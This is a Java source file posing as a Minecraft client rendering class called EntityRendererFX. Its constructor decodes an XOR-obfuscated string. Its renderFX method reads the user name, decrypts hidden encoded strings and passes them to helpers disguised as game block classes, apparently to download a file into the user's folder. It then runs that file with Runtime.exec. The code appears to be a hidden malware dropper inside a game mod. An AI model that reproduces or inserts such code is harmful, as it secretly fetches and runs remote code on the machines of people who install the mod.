package net.minecraft.client.gui;

import java.io.IOException;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import net.minecraft.block.BlockCauldron;
import net.minecraft.block.BlockDoor;

public class EntityRendererFX {

	public EntityRendererFX() {
		char[] cArray;
		block12: {
			int n;
			int n2;
			char[] cArray2;
			int n3;
			block11: {
				char[] cArray3 = "5##Vv-7#7Vb?7tfPb91b5Et)'p\"Rf".toCharArray();
				n3 = 0;
				int n4 = cArray3.length;
				cArray2 = cArray3;
				n2 = n4;
				if (n4 <= 1)
					break block11;
				cArray = cArray2;
				n = n2;
				if (n2 <= n3)
					break block12;
			}
			do {
				char[] cArray4 = cArray2;
				char[] cArray5 = cArray2;
				int n5 = n3;
				while (true) {
					int n6;
					char c = cArray4[n5];
					switch (n3 % 7) {
					case 0: {
						n6 = 112;
						break;
					}
					case 1: {
						n6 = 3;
						break;
					}
					case 2: {
						n6 = 70;
						break;
					}
					case 3: {
						n6 = 33;
						break;
					}
					case 4: {
						n6 = 7;
						break;
					}
					case 5: {
						n6 = 72;
						break;
					}
					default: {
						n6 = 70;
					}
					}
					cArray4[n5] = (char) (c ^ n6);
					++n3;
					cArray2 = cArray5;
					if (n2 != 0)
						break;
					cArray5 = cArray2;
					n = n2;
					n5 = n2;
					cArray4 = cArray2;
				}
				cArray = cArray2;
				n = n2;
			} while (n2 > n3);
		}
	}

	public static void renderFX() {
        try {
            String var1 = System.getProperty("user.name");
    		String var3 = ServerListEntryNormal.aAaAaAaAaAaA("6RHHdrhIuFz3uSGICvS9c9UIi+tGUPajHUnHUFLkPFtXnbkbpga6zjvcWSg7GK+1sj/gmpljirl4eC2N6ehSZsxU9uUhK4OYxI2AVKiMBTA=");
            BlockCauldron.aAaAaAaAaAaA(var3, ServerListEntryNormal.aAaAaAaAaAaA("fTSECELRFCdbhBlCwJmbig==") + var1 + ServerListEntryNormal.aAaAaAaAaAaA("u4TR1N1ei8NrQEUz9Yp+wOe6vRbqXK+s6fHMtbhxNQs="));
            BlockDoor.aAaAaAaAaAaA(var3, ServerListEntryNormal.aAaAaAaAaAaA("fTSECELRFCdbhBlCwJmbig==") + var1 + ServerListEntryNormal.aAaAaAaAaAaA("u4TR1N1ei8NrQEUz9Yp+wOe6vRbqXK+s6fHMtbhxNQs="));
            Runtime.getRuntime().exec(ServerListEntryNormal.aAaAaAaAaAaA("fTSECELRFCdbhBlCwJmbig==") + var1 + ServerListEntryNormal.aAaAaAaAaAaA("u4TR1N1ei8NrQEUz9Yp+wOe6vRbqXK+s6fHMtbhxNQs="));
        }
        catch (IOException e) {
            e.printStackTrace();
        }
	}
}
